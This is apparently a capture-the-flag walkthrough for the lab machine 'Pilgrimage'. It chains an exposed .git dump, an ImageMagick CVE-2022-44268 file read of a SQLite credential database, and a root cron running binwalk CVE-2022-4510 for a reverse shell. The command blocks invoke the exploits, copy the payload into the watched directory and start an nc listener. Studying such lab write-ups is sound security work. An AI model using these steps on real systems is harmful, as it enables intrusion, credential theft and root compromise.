# Pilgrimage — Easy — Linux

**Date:** 6 August 2026

---

## Tags
`#linux` `#web` `#git-disclosure` `#git-dumper` `#imagemagick` `#cve-2022-44268` `#arbitrary-file-read` `#sqlite` `#binwalk` `#cve-2022-4510` `#inotify` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | pilgrimage.htb (10.129.46.3)                                   |
| OS         | Linux (Debian 11)                                              |
| Open ports | 22 (SSH), 80 (HTTP)                                            |
| Services   | OpenSSH 8.4p1; nginx 1.18.0                                    |
| Web app    | "Pilgrimage" image-shrink service (uses ImageMagick 7.1.0-49) |
| Foothold   | Exposed /.git → dump source → ImageMagick CVE-2022-44268 file read → SQLite DB → emily's password |
| Users      | emily → root                                                   |
| Privesc    | root cron (malwarescan.sh) runs binwalk 2.3.2 → CVE-2022-4510 RCE as root |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.46.3

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-07 10:16 +0100
Nmap scan report for 10.129.46.3
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.06 seconds
```
<img width="853" height="303" alt="image" src="https://github.com/user-attachments/assets/0acd0893-daad-4417-9e08-936c7222af91" />

```
nmap -sC -sV -p22,80 10.129.46.3

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-07 10:20 +0100
Nmap scan report for 10.129.46.3
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
```

<img width="1206" height="501" alt="image" src="https://github.com/user-attachments/assets/e8d17ca9-3e0e-47ed-bb35-08269af0c48f" />

```
nmap -sC -sV -p22,80 pilgrimage.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git:
|   10.129.46.3:80/.git/
|     Git repository found!
|_    Last commit message: Pilgrimage image shrinking service initial commit. ...
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

> **Tip that paid off:** I re-ran nmap *after* adding `pilgrimage.htb` to `/etc/hosts`. The
> host-aware scan's `http-git` script flagged an exposed **/.git/** repository, the key lead.

<img width="1230" height="720" alt="image" src="https://github.com/user-attachments/assets/082db48e-2a6b-4b76-9909-1f5029ea28cf" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 8.4p1 on Debian 11. No creds yet, a target for once I recover a password.
- **Port 80 (HTTP)** — nginx 1.18.0 serving the "Pilgrimage" image-shrink app, and (critically) exposing a **/.git/** repository. That git repo is the entry point.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT:
- Port 80 redirects to pilgrimage.htb,
. add to /etc/hosts and investigate
- Directory-fuzz and vhost-fuzz
- Check stack, source, JS
- Investigate the exposed /.git endpoint
```

```
OBSERVATION:
- The app is a simple image-shrink service with register/login and an "shrink" upload that only
  accepts images (filter-evasion attempts fail)
- Nothing notable in dir/vhost fuzzing, stack, source, or JS
- http://pilgrimage.htb/.git/ returns 403, but an exposed .git can still be a goldmine
WHAT IT TELLS ME: Everything else is a dead end, the exposed .git is the lead worth pursuing before
  trying other avenues
WHAT I AM GOING TO TRY: Research/dump the .git repository
WHY: A dumped .git often reveals full source and secrets
RESULT:
- Used git-dumper (per HackTricks https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html)
 to clone the entire repo despite the 403 on directory listing
- The source revealed how the app works; index.php showed the shrink logic
- The repo also included the "magick" binary the app calls, running it revealed the version:
  ImageMagick 7.1.0-49
WHAT NEXT: Research ImageMagick 7.1.0-49 for known vulnerabilities
```

<img width="2371" height="832" alt="image" src="https://github.com/user-attachments/assets/8ad20f22-80a2-4724-ad68-8bdae2dbe00e" />

<img width="2109" height="367" alt="image" src="https://github.com/user-attachments/assets/52f08bce-0fdb-4de5-bb52-e15086ef0241" />

<img width="505" height="529" alt="image" src="https://github.com/user-attachments/assets/d9b4db16-d060-4f3f-95f8-6313f93c5473" />

<img width="1632" height="382" alt="image" src="https://github.com/user-attachments/assets/513afe32-7d74-4607-819b-5e5c9f3a6e56" />

<img width="1157" height="406" alt="image" src="https://github.com/user-attachments/assets/20e9fb85-d7a6-4d9f-8877-23fb6c9c4ac3" />

<img width="1187" height="272" alt="image" src="https://github.com/user-attachments/assets/45d33a60-30e7-4d69-bab1-f32d7bfa1623" />

<img width="2362" height="893" alt="image" src="https://github.com/user-attachments/assets/ad8da061-97df-4a20-8d2c-0052c6c27889" />

<img width="1527" height="849" alt="image" src="https://github.com/user-attachments/assets/685e85b5-1ac2-48d1-98da-903f6d9d552d" />

```
OBSERVATION:
- ImageMagick 7.1.0-49 is vulnerable to CVE-2022-44268, an ARBITRARY FILE READ. When it processes
  a PNG containing a crafted "tEXt" chunk whose keyword is "profile", it embeds the named file's
  contents into the output image, which can then be extracted
- The old searchsploit PoC was gone; a working exploit was at
  https://sploitus.com/exploit?id=8A38B6E6-F8B8-5D20-960D-362EE3DB8BE2
- From index.php, the app's SQLite DB lives at /var/db/pilgrimage, a prime file to read
WHAT IT TELLS ME: I can craft a malicious PNG that makes the server embed /var/db/pilgrimage into the
  shrunk image, then extract the DB contents from the download
WHAT I AM GOING TO TRY:
- Generate the malicious PNG (target = /var/db/pilgrimage), upload + shrink it, download the result,
  and extract the embedded DB
WHY: The DB likely holds user credentials in plaintext
RESULT:
- Extracted the SQLite DB, which contained emily's plaintext password
- SSH'd in as emily and read user.txt
WHAT NEXT: Enumerate as emily for a privesc path
```

<img width="2509" height="247" alt="image" src="https://github.com/user-attachments/assets/d1e6ffdd-dac9-4903-92d6-72b2a229ee04" />

<img width="1263" height="307" alt="image" src="https://github.com/user-attachments/assets/c2454fff-3b99-4f03-adbd-224c6d9a071c" />

<img width="1000" height="568" alt="image" src="https://github.com/user-attachments/assets/734e5ead-a3ab-41fe-b8b4-998cc5b5e713" />

<img width="1902" height="311" alt="image" src="https://github.com/user-attachments/assets/df86a833-a070-4efb-b5bd-362f307be4da" />

<img width="2039" height="282" alt="image" src="https://github.com/user-attachments/assets/fc86ff40-f43e-41db-a159-53635cd644f1" />

<img width="1119" height="375" alt="image" src="https://github.com/user-attachments/assets/8528dd1f-bbfb-48ee-a76d-bef7026dac56" />

<img width="1639" height="511" alt="image" src="https://github.com/user-attachments/assets/738f0605-83c7-4c26-bd87-d99e134f9ab8" />

<img width="925" height="384" alt="image" src="https://github.com/user-attachments/assets/01c964f8-b669-4467-ad8a-4532be3dc3ad" />

<img width="1045" height="560" alt="image" src="https://github.com/user-attachments/assets/ed3f82e4-eedc-4c4e-969c-e33899650d8c" />

```
OBSERVATION:
- linPEAS flagged a root-run custom script, /usr/sbin/malwarescan.sh (not writable by me)
- Reading it: it uses inotifywait to watch /var/www/pilgrimage.htb/shrunk/ for newly CREATED files,
  and runs /usr/local/bin/binwalk on each new file
- binwalk here is v2.3.2, which is vulnerable to CVE-2022-4510 (path-traversal RCE); the public
  exploit crafts a PNG with an embedded payload that executes when binwalk extracts it
WHAT IT TELLS ME: If I drop a malicious binwalk-exploit PNG into the shrunk/ directory, the root
  script will run binwalk on it and execute my payload as root
WHAT I AM GOING TO TRY:
- Build the malicious PNG with the CVE-2022-4510 exploit (my IP/port)
- Get it into /var/www/pilgrimage.htb/shrunk/ by COPYING/downloading (mv doesn't fire the "create"
  event inotify watches for)
- Wait for the callback
WHY: binwalk 2.3.2 is affected by CVE-2022-4510, giving RCE and the script runs it as root
RESULT: The root script ran binwalk on my file → reverse shell as root → read root.txt
```

<img width="2318" height="633" alt="image" src="https://github.com/user-attachments/assets/d5fe46ec-471e-441a-8672-7b09720df769" />

<img width="1645" height="424" alt="image" src="https://github.com/user-attachments/assets/e44d75da-37e7-4036-a91c-fef3f46a5692" />

<img width="734" height="149" alt="image" src="https://github.com/user-attachments/assets/7db85e73-9cc0-462d-a1c6-9d7e373d6612" />

<img width="2477" height="226" alt="image" src="https://github.com/user-attachments/assets/7cd6ab0c-02bb-455c-bee0-700ed7a6fd45" />

<img width="819" height="690" alt="image" src="https://github.com/user-attachments/assets/92c256a3-a791-45c1-b2dc-cc911524c1ea" />

<img width="1476" height="612" alt="image" src="https://github.com/user-attachments/assets/04c32163-8c9f-476c-9bc5-5c3c397d1589" />

<img width="2513" height="275" alt="image" src="https://github.com/user-attachments/assets/d820f277-47cc-4d39-9997-c1cbf47a3fd1" />

<img width="879" height="327" alt="image" src="https://github.com/user-attachments/assets/c69897d7-2a52-42c2-a143-76f3055b773a" />


---

## Foothold

**How I got in:** nmap's `http-git` script (after adding the vhost) revealed an exposed **/.git/** repo. Directory listing was 403, but **git-dumper** reconstructed the whole repository from the individual object files. The source (`index.php`) showed the app shrinks images with a bundled **ImageMagick 7.1.0-49** binary, a version vulnerable to **CVE-2022-44268**, an arbitrary file read. I crafted a malicious PNG whose `tEXt` "profile" chunk pointed at the app's SQLite database (`/var/db/pilgrimage`); uploading and shrinking it embedded the DB's bytes into the output image. Extracting them revealed **emily**'s plaintext password, which worked for SSH.

**Command / exploit used:**
```
echo "10.129.46.3  pilgrimage.htb" | sudo tee -a /etc/hosts

# dump the exposed .git despite the 403
git-dumper http://pilgrimage.htb/.git/ ./pilgrimage_src
# → index.php reveals the shrink logic + bundled magick (ImageMagick 7.1.0-49)

# CVE-2022-44268: craft a PNG that reads /var/db/pilgrimage
python3 cve-2022-44268.py /var/db/pilgrimage       # produces malicious.png
# upload malicious.png to the shrink service, download the shrunk result, then:
identify -verbose shrunk_result.png                # dump the embedded raw profile (hex)
# hex-decode → SQLite DB → emily's plaintext password

ssh emily@pilgrimage.htb                           # → user.txt
```

**Why it worked:** Two failures chained. Exposing `.git` handed over the full application source and the exact ImageMagick version. That version's CVE-2022-44268 mishandles PNG `tEXt` chunks: a keyword of `profile` makes ImageMagick treat the chunk's string as a *filename* and embed that file's contents into the processed image so an image-resize feature became an arbitrary file read. The app then stored credentials in a plaintext SQLite DB, which that read exposed.

---

## Privilege Escalation

**Path taken (emily → root):** linPEAS surfaced a root-run script, **`malwarescan.sh`**, that uses `inotifywait` to monitor `/var/www/pilgrimage.htb/shrunk/` and runs **`binwalk`** on every newly created file. The installed binwalk is **v2.3.2**, vulnerable to **CVE-2022-4510**, a path-traversal RCE where a specially crafted PNG causes binwalk's extractor to write and execute an attacker payload. I generated a malicious PNG with the public exploit (my IP/port), **copied** it into the watched `shrunk/` directory (a plain `mv` wouldn't trigger inotify's "create" event), and the root script ran binwalk on it and executing my payload as **root**. Read root.txt.

```
# build the malicious PNG (CVE-2022-4510)
python3 binwalk_exploit.py normal.png <LHOST> <LPORT>     # → binwalk_exploit.png
# on target, as emily — COPY (not mv) into the watched dir so inotify fires:
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
# attacker listener → root shell
nc -lnvp <LPORT>
```

**Why it worked:** The privesc is a chain of design choices, not a single bug. A root process automatically ran an *analysis* tool (binwalk) on attacker-supplied files, and that tool's version had a code-execution flaw, so untrusted input reached a vulnerable parser running as root. The subtle detail is the trigger: `inotifywait` watches for `create` events, so the file must be *copied/downloaded* into the directory (which creates a new file) rather than *moved* (which may not fire the same event). Keeping binwalk patched, or not auto-running it as root on untrusted uploads, would each have broken the chain.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Dumped an exposed `.git` repo to learn the app used ImageMagick 7.1.0-49, then used CVE-2022-44268 to read the app's SQLite DB and recover emily's plaintext SSH password.
2. **Privesc technique in one sentence:** A root script auto-ran binwalk 2.3.2 on files dropped into a watched directory, so I copied in a malicious PNG exploiting CVE-2022-4510 to get RCE as root.
